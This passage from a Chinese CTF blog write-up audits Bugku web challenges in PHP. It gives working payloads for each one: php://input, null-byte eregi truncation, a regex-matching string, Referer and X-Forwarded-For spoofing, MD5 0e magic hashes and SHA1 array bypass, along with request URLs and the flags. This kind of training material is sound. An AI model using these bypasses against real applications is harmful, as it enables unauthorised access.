class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.bugku.com';</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>"<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: hello.php?id=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'no no no no no no no'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">==</span><span class="token string">"bugku is a nice plateform!"</span> <span class="token keyword">and</span> <span class="token variable">$id</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span> <span class="token keyword">and</span> <span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"1114"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">"f4l2a3g.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">print</span> <span class="token string">"never never never give up !!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token operator">--</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有两种方法可以拿到flag，第一种就是代码审计，先来审计吧</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 如果没有GET到id，直接跳转到hello.php?id=1</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: hello.php?id=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 定义三个接收参数的变量</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 如果a中含有字符.输出no no no</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'no no no no no no no'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 把读取文件的内容赋值给data</span><span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 条件一：data弱等于bugku is a nice plateform!</span><span class="token shell-comment comment"># 条件二：id若等于0</span><span class="token shell-comment comment"># 条件三：b的长度要大于5</span><span class="token shell-comment comment"># 条件四：字符串111加$b的第一个字符要与字符串1114匹配</span><span class="token shell-comment comment"># 条件五：$b的第一个字符串不可以是4</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">==</span><span class="token string">"bugku is a nice plateform!"</span> <span class="token keyword">and</span> <span class="token variable">$id</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span> <span class="token keyword">and</span> <span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"1114"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">"f4l2a3g.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">print</span> <span class="token string">"never never never give up !!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要是上文中的五个条件，我们一个一个来实现</p><h5 id="PHP伪协议-1"><a href="#PHP伪协议-1" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h5><p><strong>条件一：$data弱等于字符串bugku is a nice plateform!</strong></p><p>而$data是由函数file_get_contents()读取$a的内容来赋值的，所以$a就必须是数据流，要从a这里进行数据的传输，然后赋值给data，这样一来就用到php://input这个伪协议，并且使用的时候提交数据bugku is a nice plateform!就行了。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113164307569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这样一来条件一就出来了</p><pre class="line-numbers language-php"><code class="language-php">a<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input</span><span class="token shell-comment comment"># 且附加数据bugku is a nice plateform!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="PHP弱类型比较"><a href="#PHP弱类型比较" class="headerlink" title="PHP弱类型比较"></a>PHP弱类型比较</h5><p><strong>条件二：id非空非零且弱等于整型数 0</strong><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113163213682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>根据上图比较， 我写了一段验证代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Yes'</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'No'</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按理说我们验证id=0也是可以正常输出的，但是在本题中就是不可以，真是搞不懂为什么，那我们就用非零非数字的参数吧：</p><pre class="line-numbers language-php"><code class="language-php">id<span class="token operator">=</span>a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="eregi-截断漏洞"><a href="#eregi-截断漏洞" class="headerlink" title="eregi()截断漏洞"></a>eregi()截断漏洞</h5><p> ereg() 函数或 eregi() 函数是存在空字符截断漏洞的：即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据，为了方便理解，我把代码拿出来做了测试：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"1114"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>错误：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113173120766.png#pic_center" alt="在这里插入图片描述"></p><p>正确：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111317314710.png#pic_center" alt="在这里插入图片描述"><br>当我们截断后，后面跟什么他都会匹配上：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113173228882.png#pic_center" alt="在这里插入图片描述"><br>再来看一下条件三四五：</p><p><strong>条件三：b的长度要大于5</strong></p><p><strong>条件四：字符串111加$b的第一个字符要与字符串1114匹配</strong></p><p><strong>条件五：$b的第一个字符串不可以是4</strong></p><p>这样一来变量b的参数我们就构造出来了：</p><pre class="line-numbers language-php"><code class="language-php">b<span class="token operator">=</span><span class="token operator">%</span>00qaz123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h5><p>抓个包，把构造好的参数拼接起来发包即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201113173757669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>flag：flag{tHis_iS_THe_fLaG}</strong></p><p>第二个方法就是直接访问源码中的f4l2a3g.txt，这样最简单，也最没意思。</p><h3 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h3><h5 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h5><p>这道题涉及到正则表达式，现在编程的正则都几乎相通，我这篇文章写的是Python的正则，在这道题中一样可以用的，<a href="https://blog.csdn.net/qq_43573676/article/details/106952407" target="_blank" rel="noopener">正则表达式详细教程</a>。</p><p>首先我们来分析一下源码，因为我PHP也没有学正则，刚上来也是一脸懵逼，不过运行了几次之后就明白它的匹配规则了：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 高亮显示2.php的内容</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 定义变量key</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string">'KEY{********************************}'</span><span class="token punctuation">;</span><span class="token shell-comment comment"># preg_match()正则匹配，trim()去除首尾的特殊转移字符跟空白字符，把结果返回给IM</span><span class="token variable">$IM</span><span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i"</span><span class="token punctuation">,</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 如果符合IM为1则输出key</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$IM</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'key is: '</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就不再对正则作过多的介绍，不懂的去看一下我那篇文章吧~重点就在这段代码中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span>key<span class="token punctuation">.</span><span class="token operator">*</span>key<span class="token punctuation">.</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">}</span>key<span class="token punctuation">:</span>\<span class="token operator">/</span><span class="token punctuation">.</span>\<span class="token operator">/</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">:</span>punct<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">/</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首先它的格式是这样的，i代表不区分大小写：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span>正则匹配规则<span class="token operator">/</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>key 就是匹配 字符串key 没别的意思</strong><br><strong>. 代表任意一个字符<br>* 代表前一个字符可以匹配0次或多次</strong><br><strong>{4,7} 代表前一个字符最少匹配4次，最多匹配7次</strong><br><strong>: 就是 字符串: 没别的意思</strong><br><strong>\/.\/ 其实就是 /./ 它加上\是为了防止转义，/ 就是 字符串/ 没别的意思</strong><br><strong>(.*key) 就是匹配0个或多个key前面的字符</strong><br><strong>[a-z] 匹配任意一个英文字母</strong><br><strong>[[:punct:]] 匹配任意一个特殊字符</strong></p><p>如果你还是看不明白，就去学习一下正则吧，自己动手做做！</p><pre class="line-numbers language-php"><code class="language-php">payload：<span class="token operator">?</span>id<span class="token operator">=</span>keykeyaaaakey<span class="token punctuation">:</span><span class="token operator">/</span>a<span class="token operator">/</span>keya`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201114174205467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>flag：KEY{0x0SIOPh550afc}</strong></p><h3 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h3><h5 id="抓包改referer头"><a href="#抓包改referer头" class="headerlink" title="抓包改referer头"></a>抓包改referer头</h5><p>这道题我寻思了半天，一点提示都没有，没办法我就去网上搜了一下，原来是加一个referer头…真是有CTF内味儿了</p><p>抓个包先<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201114175206777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后在他的herders选项中添加referer:<a href="https://www.google.com即可：" target="_blank" rel="noopener">https://www.google.com即可：</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111417541593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>flag：flag{bug-ku_ai_admin}</strong></p><h3 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h3><h5 id="md5碰撞-1"><a href="#md5碰撞-1" class="headerlink" title="md5碰撞"></a>md5碰撞</h5><p>这道题的思路就是题目名字，md5碰撞，这道题钱前面其实做过一次了，就是那道<strong>备份是个好习惯</strong>，我们只需要传一个经过加密后以0e开头的字符串过去就i行了：</p><pre class="line-numbers language-php"><code class="language-php">exp：http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:9009/md5.php?a=s1885207154a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>flag：flag{md5_collision_is_easy}</strong></p><h3 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h3><h5 id="抓包-3"><a href="#抓包-3" class="headerlink" title="抓包"></a>抓包</h5><p>这个很简单，题目要求从本地访问，我们抓包加一个x-forwarded-for头为127.0.0.1即可：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201114233553312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>flag：flag{loc-al-h-o-st1}</strong></p><h3 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h3><h5 id="代码审计-5"><a href="#代码审计-5" class="headerlink" title="代码审计"></a>代码审计</h5><p>上来就给了一段代码，那我们就审计一下吧：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 高亮显示flag.php的文件内容</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># url解码所获取的id内容</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 定义变量flag</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'flag{xxxxxxxxxxxxxxxxxx}'</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 如果没有GETuname和POSTpasswd</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token shell-comment comment"># 如果GET的uname弱等于POST的passwd</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token shell-comment comment"># 输出passwd can not be uname.</span>        <span class="token keyword">print</span> <span class="token string">'passwd can not be uname.'</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 或者经过sha1加密的uname全等于sha1加密的passwd，并且id弱等于字符串margin</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'margin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token shell-comment comment"># 退出程序并打印flag</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 否则输出sorry！</span>    <span class="token keyword">else</span>        <span class="token keyword">print</span> <span class="token string">'sorry!'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>突破点就在这一行：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment"># 或者经过sha1加密的uname全等于sha1加密的passwd，并且id弱等于字符串margin</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'margin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意三点：</p><p> <strong>1. GET的uname与POST的passwd值不能相等。<br> 2. 经过SHA1加密的uname与passwd必须全等于。<br> 3. GET的id必须等于margin</strong></p><p>第二条我们只需要传递数组就行了，数组经过处理后的哈希值是一样的，所以exp就出来了：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">POST</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/web7/?uname[]=a&amp;id=margin</span>passwd<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115000601434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：flag{HACK_45hhs_213sDD}</strong></p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><h5 id="代码审计-6"><a href="#代码审计-6" class="headerlink" title="代码审计"></a>代码审计</h5><p>先来审计下代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 从数组中将变量导入到当前的符号表</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 判断变量ac是否为空</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$ac</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 变量f等于fn，这里的fn一定是一个储存文件的变量</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 如果ac全等于f，也就是我们传递的ac的值全等于$fn文件里的内容</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ac</span> <span class="token operator">===</span> <span class="token 